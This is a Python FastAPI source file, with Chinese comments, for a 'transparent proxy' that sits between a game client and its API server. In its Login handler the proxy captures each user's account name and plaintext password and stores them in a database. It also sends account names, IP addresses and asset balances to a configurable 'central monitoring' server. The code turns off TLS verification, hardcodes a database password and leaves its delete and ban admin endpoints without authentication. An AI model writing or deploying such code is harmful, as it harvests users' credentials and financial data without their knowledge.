# -*- coding: utf-8 -*-
"""
透明代理服务器
用户在本地运行，游戏客户端连接本地代理，代理直接转发到API服务器。
API服务器看到的是用户自己的IP，同时代理拦截登录/资产数据并上报到中央监控。
"""

import asyncio
import json
import sys
import os
import io
import time
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime
from typing import Optional

import httpx
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# 修复Windows控制台中文乱码
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# 加载配置
sys.path.insert(0, os.path.dirname(__file__))
try:
    from config import *
except ImportError:
    PROXY_HOST = "0.0.0.0"
    PROXY_PORT = 8080
    AKAPI_URL = "https://www.akapi1.com/RPC/"
    MONITOR_SERVER = ""
    MONITOR_API_KEY = ""
    LOG_FILE = "proxy.log"
    LOG_LEVEL = "INFO"
    LOG_TO_CONSOLE = True
    LOG_TO_FILE = True
    REQUEST_TIMEOUT = 30
    ENABLE_LOCAL_BAN = True
    DB_HOST = "127.0.0.1"
    DB_PORT = 5432
    DB_NAME = "ak_proxy"
    DB_USER = "ak_proxy"
    DB_PASSWORD = "ak2026db"
    DB_MIN_POOL = 10
    DB_MAX_POOL = 30

# 数据库模块
import database_pg as db

# ===== 日志配置 =====
logger = logging.getLogger("TransparentProxy")
logger.setLevel(getattr(logging, LOG_LEVEL, logging.INFO))
formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

if LOG_TO_CONSOLE:
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(formatter)
    logger.addHandler(ch)

if LOG_TO_FILE:
    log_path = os.path.join(os.path.dirname(__file__), LOG_FILE)
    fh = RotatingFileHandler(
        log_path, maxBytes=1*1024*1024*1024, backupCount=3, encoding='utf-8'
    )
    fh.setFormatter(formatter)
    logger.addHandler(fh)

# ===== 统计数据 =====
class ProxyStats:
    def __init__(self):
        self.start_time = datetime.now()
        self.total_requests = 0
        self.login_requests = 0
        self.login_success = 0
        self.login_fail = 0
        self.index_data_requests = 0
        self.other_requests = 0
        self.errors = 0
        self.last_login_account = ""
        self.last_login_time = ""
        self.report_success = 0
        self.report_fail = 0
        # 本地封禁列表
        self.banned_accounts: set = set()
        self.banned_ips: set = set()

stats = ProxyStats()

# ===== FastAPI 应用 =====
app = FastAPI(title="AK透明代理")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
async def startup():
    """启动时初始化数据库连接池"""
    try:
        await db.init_db(
            host=DB_HOST, port=DB_PORT, database=DB_NAME,
            user=DB_USER, password=DB_PASSWORD,
            min_size=DB_MIN_POOL, max_size=DB_MAX_POOL
        )
        logger.info("PostgreSQL 数据库连接成功")
        # 启动定期清理任务
        asyncio.create_task(_periodic_cleanup())
    except Exception as e:
        logger.error(f"PostgreSQL 连接失败: {e}，将使用内存模式")


async def _periodic_cleanup():
    """每6小时清理旧数据，平衡性能和存储"""
    while True:
        await asyncio.sleep(6 * 3600)  # 6小时
        try:
            await db.cleanup_old_records(
                login_days=90,       # 登录记录保留90天
                history_days=180,    # 资产历史保留180天
                max_login_rows=500000,   # 最多50万条登录记录
                max_history_rows=200000  # 最多20万条资产历史
            )
        except Exception as e:
            logger.warning(f"定期清理失败: {e}")


@app.on_event("shutdown")
async def shutdown():
    """关闭时释放数据库连接池"""
    await db.close_db()

# ===== 工具函数 =====
def parse_request_params(content_type: str, query_params: dict, raw_body: bytes) -> dict:
    """统一解析请求参数（支持JSON/Form/QueryString）"""
    params = dict(query_params)
    
    if not raw_body:
        return params
    
    try:
        if "application/json" in content_type:
            body = json.loads(raw_body)
            params.update(body)
        elif "application/x-www-form-urlencoded" in content_type:
            from urllib.parse import parse_qs
            form_data = parse_qs(raw_body.decode('utf-8'))
            for key, value in form_data.items():
                params[key] = value[0] if value else ''
        else:
            # 尝试JSON，失败则尝试Form
            try:
                body = json.loads(raw_body)
                params.update(body)
            except (json.JSONDecodeError, UnicodeDecodeError):
                try:
                    from urllib.parse import parse_qs
                    form_data = parse_qs(raw_body.decode('utf-8'))
                    for key, value in form_data.items():
                        params[key] = value[0] if value else ''
                except Exception:
                    pass
    except Exception as e:
        logger.warning(f"参数解析异常: {e}")
    
    return params


async def report_to_monitor(endpoint: str, data: dict):
    """上报数据到中央监控服务器（异步，不阻塞主流程）"""
    if not MONITOR_SERVER:
        return
    
    url = f"{MONITOR_SERVER.rstrip('/')}/api/transparent_proxy/{endpoint}"
    headers = {"Content-Type": "application/json"}
    if MONITOR_API_KEY:
        headers["X-API-Key"] = MONITOR_API_KEY
    
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            resp = await client.post(url, json=data, headers=headers)
            if resp.status_code == 200:
                stats.report_success += 1
            else:
                stats.report_fail += 1
                logger.warning(f"上报失败 [{endpoint}]: HTTP {resp.status_code}")
    except Exception as e:
        stats.report_fail += 1
        logger.debug(f"上报异常 [{endpoint}]: {e}")


async def forward_request(method: str, api_path: str, content_type: str,
                          params: dict, raw_body: bytes, headers: dict) -> httpx.Response:
    """转发请求到真实API服务器"""
    url = AKAPI_URL + api_path
    fwd_headers = {
        "User-Agent": headers.get("user-agent", ""),
        "Content-Type": content_type or "application/json",
        "Accept": headers.get("accept", "*/*"),
    }
    
    async with httpx.AsyncClient(verify=False, timeout=REQUEST_TIMEOUT) as client:
        if method == "GET":
            return await client.get(url, params=params, headers=fwd_headers)
        else:
            if "application/json" in (content_type or ""):
                return await client.post(url, json=params, headers=fwd_headers)
            elif raw_body:
                return await client.post(url, content=raw_body, headers=fwd_headers)
            else:
                return await client.post(url, data=params, headers=fwd_headers)


# ===== 状态页 =====
@app.get("/", response_class=HTMLResponse)
async def status_page():
    """代理状态页面"""
    uptime = datetime.now() - stats.start_time
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    monitor_status = f'<span style="color:#00ff88">已连接 ({MONITOR_SERVER})</span>' if MONITOR_SERVER else '<span style="color:#888">未配置</span>'
    
    html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>AK透明代理</title>
<style>
body {{ background: #0a0e1a; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; padding: 40px; }}
.card {{ background: #141928; border: 1px solid #2a2f45; border-radius: 12px; padding: 25px; margin: 15px 0; }}
h1 {{ color: #00e5ff; }} h3 {{ color: #00ff88; margin-top: 0; }}
.stat {{ display: inline-block; min-width: 150px; margin: 8px 15px 8px 0; }}
.stat .val {{ font-size: 28px; font-weight: bold; color: #00e5ff; }}
.stat .label {{ font-size: 13px; color: #888; }}
.ok {{ color: #00ff88; }} .err {{ color: #ff5252; }}
</style></head><body>
<h1>🔄 AK 透明代理服务器</h1>
<div class="card">
    <h3>运行状态</h3>
    <div class="stat"><div class="val">{hours}h {minutes}m {seconds}s</div><div class="label">运行时间</div></div>
    <div class="stat"><div class="val">{stats.total_requests}</div><div class="label">总请求数</div></div>
    <div class="stat"><div class="val">{stats.errors}</div><div class="label">错误数</div></div>
</div>
<div class="card">
    <h3>登录统计</h3>
    <div class="stat"><div class="val">{stats.login_requests}</div><div class="label">登录请求</div></div>
    <div class="stat"><div class="val ok">{stats.login_success}</div><div class="label">成功</div></div>
    <div class="stat"><div class="val err">{stats.login_fail}</div><div class="label">失败</div></div>
    <div class="stat"><div class="val">{stats.last_login_account or '-'}</div><div class="label">最近登录</div></div>
</div>
<div class="card">
    <h3>API统计</h3>
    <div class="stat"><div class="val">{stats.index_data_requests}</div><div class="label">IndexData</div></div>
    <div class="stat"><div class="val">{stats.other_requests}</div><div class="label">其他RPC</div></div>
</div>
<div class="card">
    <h3>中央监控上报</h3>
    <p>状态: {monitor_status}</p>
    <div class="stat"><div class="val ok">{stats.report_success}</div><div class="label">上报成功</div></div>
    <div class="stat"><div class="val err">{stats.report_fail}</div><div class="label">上报失败</div></div>
</div>
<div class="card" style="color:#888; font-size:13px;">
    <p>API目标: {AKAPI_URL}</p>
    <p>监听地址: {PROXY_HOST}:{PROXY_PORT}</p>
    <p>启动时间: {stats.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
</div>
</body></html>"""
    return html


# ===== 登录拦截 =====
@app.api_route("/RPC/Login", methods=["GET", "POST"])
async def proxy_login(request: Request):
    """拦截登录请求：记录 → 转发(用户自己的IP) → 处理结果 → 上报"""
    stats.total_requests += 1
    stats.login_requests += 1
    
    client_ip = request.client.host if request.client else "unknown"
    user_agent = request.headers.get("user-agent", "")
    content_type = request.headers.get("content-type", "")
    
    # 解析参数
    raw_body = await request.body() if request.method == "POST" else b""
    params = parse_request_params(content_type, dict(request.query_params), raw_body)
    
    account = params.get("account", "unknown")
    password = params.get("password", "")
    
    logger.info(f"[Login] 账号={account}, IP={client_ip}")
    
    # 本地封禁检查（优先数据库，回退内存）
    if ENABLE_LOCAL_BAN:
        try:
            banned = await db.is_banned(username=account, ip_address=client_ip)
        except Exception:
            banned = account in stats.banned_accounts or client_ip in stats.banned_ips
        if banned:
            logger.warning(f"[Login] 封禁拦截: account={account}, IP={client_ip}")
            return JSONResponse({"Error": True, "Msg": "您的账号或IP已被封禁"})
    
    # 直接转发到API服务器（用户自己的IP出去）
    try:
        response = await forward_request(
            request.method, "Login", content_type, params, raw_body, dict(request.headers)
        )
        result = response.json()
    except Exception as e:
        stats.errors += 1
        logger.error(f"[Login] 转发失败: {e}")
        return JSONResponse({"Error": True, "Msg": f"API连接失败: {str(e)}"})
    
    # 判断登录结果
    is_success = result.get("Error") == False or (not result.get("Error") and result.get("UserData"))
    
    if is_success:
        stats.login_success += 1
        stats.last_login_account = account
        stats.last_login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logger.info(f"[Login] 登录成功: {account}")
    else:
        stats.login_fail += 1
        logger.info(f"[Login] 登录失败: {account}, Msg={result.get('Msg', '')}")
    
    # 记录到 PostgreSQL 数据库
    try:
        await db.record_login(
            username=account, ip_address=client_ip,
            user_agent=user_agent[:200],
            request_path="/RPC/Login",
            status_code=200 if is_success else 401,
            is_success=is_success, password=password,
            extra_data=json.dumps({"status": "success" if is_success else "failed", "msg": result.get("Msg", "")})
        )
    except Exception as e:
        logger.warning(f"[Login] 数据库记录失败: {e}")

    # 异步上报到中央监控服务器
    report_data = {
        "account": account,
        "client_ip": client_ip,
        "user_agent": user_agent[:200],
        "is_success": is_success,
        "msg": result.get("Msg", ""),
        "time": datetime.now().replace(microsecond=0).isoformat(),
    }
    
    # 如果登录成功，提取资产数据并存入数据库
    if is_success and result.get("UserData"):
        user_data = result["UserData"]
        try:
            await db.update_user_assets(account, user_data)
        except Exception as e:
            logger.warning(f"[Login] 资产保存失败: {e}")
        report_data["assets"] = {
            "EP": user_data.get("EP", 0),
            "SP": user_data.get("SP", 0),
            "RP": user_data.get("RP", 0),
            "TP": user_data.get("TP", 0),
            "ACECount": user_data.get("ACECount", 0),
            "TotalACE": user_data.get("TotalACE", 0),
            "WeeklyMoney": user_data.get("WeeklyMoney", 0),
            "HonorName": user_data.get("HonorName", ""),
            "LevelNumber": user_data.get("LevelNumber", 0),
            "Rate": user_data.get("Rate", 0),
            "Credit": user_data.get("Credit", 0),
            "AP": user_data.get("AP", 0),
            "LP": user_data.get("LP", 0),
            "Convertbalance": user_data.get("Convertbalance", 0),
        }
    
    asyncio.create_task(report_to_monitor("login", report_data))
    
    # 返回原始结果
    resp = JSONResponse(result)
    if is_success:
        resp.set_cookie(key="ak_username", value=account, max_age=86400*30, httponly=False, samesite="lax")
    return resp


# ===== IndexData 拦截 =====
@app.api_route("/RPC/public_IndexData", methods=["GET", "POST"])
async def proxy_index_data(request: Request):
    """拦截资产数据请求：转发 → 提取数据 → 上报"""
    stats.total_requests += 1
    stats.index_data_requests += 1
    
    client_ip = request.client.host if request.client else "unknown"
    content_type = request.headers.get("content-type", "")
    
    raw_body = await request.body() if request.method == "POST" else b""
    params = parse_request_params(content_type, dict(request.query_params), raw_body)
    
    logger.debug(f"[IndexData] 请求参数: {list(params.keys())}")
    
    # 直接转发
    try:
        response = await forward_request(
            request.method, "public_IndexData", content_type, params, raw_body, dict(request.headers)
        )
        result = response.json()
    except Exception as e:
        stats.errors += 1
        logger.error(f"[IndexData] 转发失败: {e}")
        return JSONResponse({"Error": True, "Msg": f"API连接失败: {str(e)}"})
    
    # 提取资产数据并上报
    if not result.get("Error") and result.get("Data"):
        data = result["Data"]
        username = (params.get("account") or params.get("Account") or
                   data.get("UserName") or data.get("Account") or
                   stats.last_login_account or "unknown")
        
        if username and username != "unknown" and ('ACECount' in data or 'EP' in data):
            # 保存到 PostgreSQL
            try:
                await db.update_user_assets(username, data)
            except Exception as e:
                logger.warning(f"[IndexData] 资产保存失败: {e}")
            report_data = {
                "account": username,
                "client_ip": client_ip,
                "time": datetime.now().replace(microsecond=0).isoformat(),
                "assets": {
                    "EP": data.get("EP", 0),
                    "SP": data.get("SP", 0),
                    "RP": data.get("RP", 0),
                    "TP": data.get("TP", 0),
                    "ACECount": data.get("ACECount", 0),
                    "TotalACE": data.get("TotalACE", 0),
                    "WeeklyMoney": data.get("WeeklyMoney", 0),
                    "HonorName": data.get("HonorName", ""),
                    "LevelNumber": data.get("LevelNumber", 0),
                    "Rate": data.get("Rate", 0),
                    "Credit": data.get("Credit", 0),
                    "AP": data.get("AP", 0),
                    "LP": data.get("LP", 0),
                    "Convertbalance": data.get("Convertbalance", 0),
                }
            }
            asyncio.create_task(report_to_monitor("asset_update", report_data))
            logger.info(f"[IndexData] 资产更新: {username}")
    
    return JSONResponse(result)


# ===== 通用 RPC 代理 =====
@app.api_route("/RPC/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def proxy_rpc(path: str, request: Request):
    """透明转发所有其他RPC请求"""
    stats.total_requests += 1
    stats.other_requests += 1
    
    client_ip = request.client.host if request.client else "unknown"
    content_type = request.headers.get("content-type", "")
    
    # 封禁检查（优先数据库）
    if ENABLE_LOCAL_BAN:
        try:
            if await db.is_banned(ip_address=client_ip):
                return JSONResponse({"Error": True, "Msg": "您的IP已被封禁"})
        except Exception:
            if client_ip in stats.banned_ips:
                return JSONResponse({"Error": True, "Msg": "您的IP已被封禁"})
    
    raw_body = None
    if request.method in ["POST", "PUT"]:
        raw_body = await request.body()
    
    params = {}
    if raw_body:
        try:
            params = json.loads(raw_body)
        except (json.JSONDecodeError, UnicodeDecodeError):
            pass
    
    logger.debug(f"[RPC/{path}] 转发请求")
    
    try:
        response = await forward_request(
            request.method, path, content_type, params, raw_body, dict(request.headers)
        )
        try:
            result = response.json()
            return JSONResponse(content=result, status_code=response.status_code)
        except Exception:
            return JSONResponse(content=response.text, status_code=response.status_code)
    except Exception as e:
        stats.errors += 1
        logger.error(f"[RPC/{path}] 转发失败: {e}")
        return JSONResponse({"Error": True, "Msg": f"请求失败: {str(e)}"}, status_code=500)


# ===== 管理API =====
@app.get("/api/status")
async def api_status():
    """获取代理状态（JSON）"""
    uptime = (datetime.now() - stats.start_time).total_seconds()
    return {
        "running": True,
        "uptime_seconds": int(uptime),
        "total_requests": stats.total_requests,
        "login": {
            "total": stats.login_requests,
            "success": stats.login_success,
            "fail": stats.login_fail,
            "last_account": stats.last_login_account,
            "last_time": stats.last_login_time,
        },
        "index_data_requests": stats.index_data_requests,
        "other_requests": stats.other_requests,
        "errors": stats.errors,
        "report": {
            "server": MONITOR_SERVER or "未配置",
            "success": stats.report_success,
            "fail": stats.report_fail,
        },
        "api_target": AKAPI_URL,
    }


@app.get("/api/db/size")
async def api_db_size():
    """查看数据库各表存储占用"""
    try:
        size_info = await db.get_db_size()
        row_counts = await db.get_table_row_counts()
        for t in size_info.get('tables', []):
            t['row_count_exact'] = row_counts.get(t['table_name'], 0)
        return {"success": True, "data": size_info}
    except Exception as e:
        return {"success": False, "message": f"查询失败: {e}"}


@app.post("/api/db/delete")
async def api_db_delete(request: Request):
    """按日期删除指定表数据
    参数: table, before_date, after_date, exact_date (YYYY-MM-DD)
    """
    try:
        data = await request.json()
        table = data.get("table", "")
        before_date = data.get("before_date")
        after_date = data.get("after_date")
        exact_date = data.get("exact_date")
        deleted = await db.delete_by_date(table, before_date, after_date, exact_date)
        return {"success": True, "deleted": deleted, "table": table}
    except ValueError as e:
        return {"success": False, "message": str(e)}
    except Exception as e:
        return {"success": False, "message": f"删除失败: {e}"}


@app.get("/api/db/stats")
async def api_db_stats():
    """获取数据库统计摘要 + 连接池状态"""
    try:
        summary = await db.get_stats_summary()
        row_counts = await db.get_table_row_counts()
        pool_info = db.get_pool_info()
        return {"success": True, "summary": summary, "row_counts": row_counts, "pool": pool_info}
    except Exception as e:
        return {"success": False, "message": f"查询失败: {e}"}


@app.post("/api/ban")
async def api_ban(request: Request):
    """封禁账号或IP（持久化到PostgreSQL）"""
    data = await request.json()
    ban_type = data.get("type", "")
    value = data.get("value", "")
    reason = data.get("reason", "")
    
    if ban_type == "account" and value:
        stats.banned_accounts.add(value.lower())
        try:
            await db.ban_user(value, reason)
        except Exception as e:
            logger.warning(f"[Ban] 数据库封禁失败: {e}")
        logger.info(f"[Ban] 封禁账号: {value}")
        return {"success": True, "message": f"已封禁账号: {value}"}
    elif ban_type == "ip" and value:
        stats.banned_ips.add(value)
        try:
            await db.ban_ip(value, reason)
        except Exception as e:
            logger.warning(f"[Ban] 数据库封禁失败: {e}")
        logger.info(f"[Ban] 封禁IP: {value}")
        return {"success": True, "message": f"已封禁IP: {value}"}
    
    return {"success": False, "message": "参数无效，需要 type(account/ip) 和 value"}


@app.post("/api/unban")
async def api_unban(request: Request):
    """解除封禁（持久化到PostgreSQL）"""
    data = await request.json()
    ban_type = data.get("type", "")
    value = data.get("value", "")
    
    if ban_type == "account" and value:
        stats.banned_accounts.discard(value.lower())
        try:
            await db.unban_user(value)
        except Exception as e:
            logger.warning(f"[Unban] 数据库解封失败: {e}")
        logger.info(f"[Unban] 解封账号: {value}")
        return {"success": True, "message": f"已解封账号: {value}"}
    elif ban_type == "ip" and value:
        stats.banned_ips.discard(value)
        try:
            await db.unban_ip(value)
        except Exception as e:
            logger.warning(f"[Unban] 数据库解封失败: {e}")
        logger.info(f"[Unban] 解封IP: {value}")
        return {"success": True, "message": f"已解封IP: {value}"}
    
    return {"success": False, "message": "参数无效"}


# ===== 启动 =====
def main():
    """启动透明代理服务器"""
    print("=" * 60)
    print("  AK 透明代理服务器")
    print("=" * 60)
    print(f"  监听地址: http://{PROXY_HOST}:{PROXY_PORT}")
    print(f"  API目标:  {AKAPI_URL}")
    print(f"  中央监控: {MONITOR_SERVER or '未配置'}")
    print(f"  本地封禁: {'启用' if ENABLE_LOCAL_BAN else '禁用'}")
    print(f"  PostgreSQL: {DB_HOST}:{DB_PORT}/{DB_NAME} (pool={DB_MIN_POOL}-{DB_MAX_POOL})")
    print("=" * 60)
    print()
    print("  使用方式:")
    print(f"  将游戏客户端的API地址改为: http://你的IP:{PROXY_PORT}/RPC/")
    print(f"  或本机使用: http://127.0.0.1:{PROXY_PORT}/RPC/")
    print()
    print(f"  状态页面: http://127.0.0.1:{PROXY_PORT}/")
    print(f"  状态API:  http://127.0.0.1:{PROXY_PORT}/api/status")
    print("=" * 60)
    
    uvicorn.run(app, host=PROXY_HOST, port=PROXY_PORT, log_level="warning")


if __name__ == "__main__":
    main()
